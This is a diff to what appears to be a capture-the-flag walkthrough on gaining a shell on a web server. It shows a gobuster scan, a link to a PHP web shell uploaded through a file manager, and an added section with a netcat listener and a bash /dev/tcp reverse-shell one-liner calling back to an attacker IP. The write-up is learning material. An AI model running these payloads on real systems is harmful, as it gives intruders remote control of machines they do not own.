@@ -85,7 +85,7 @@ gobuster dir -u http://<ip-address>:85 -w /home/user/wordlist/dirb/big.txt -x ph
 
 ### I went to Files -> File Manager and uploaded a php shell file
 
-[I used this reverse shell file](wget https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php)
+[I used this reverse shell file](https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php)
 
 ![image](https://github.com/user-attachments/assets/53ad07a7-c823-42d5-a0b7-fd53766ebf86)
 
@@ -106,6 +106,28 @@ gobuster dir -u http://<ip-address>:85 -w /home/user/wordlist/dirb/big.txt -x ph
 
 
 ### Example
+
+#### Let's run 'ls -la' command
+
+![image](https://github.com/user-attachments/assets/4c722155-70fe-4102-aca6-9c16878166d8)
+
+
+
+### Web Shell to Reverse Shell
+
+#### Setup a listener 
+```bash
+nc -lvnp 1234
+```
+#### Execute the reverse shell payload
+```bash
+bash -c 'bash -i >& /dev/tcp/10.17.45.216/1234 0>&1'
+```
+#### Once you execute the payload you will get the reverse shell in your terminal
+
+![image](https://github.com/user-attachments/assets/0dab0bbc-8306-4198-9ea2-b4b3726cd717)
+
+
 
 
 
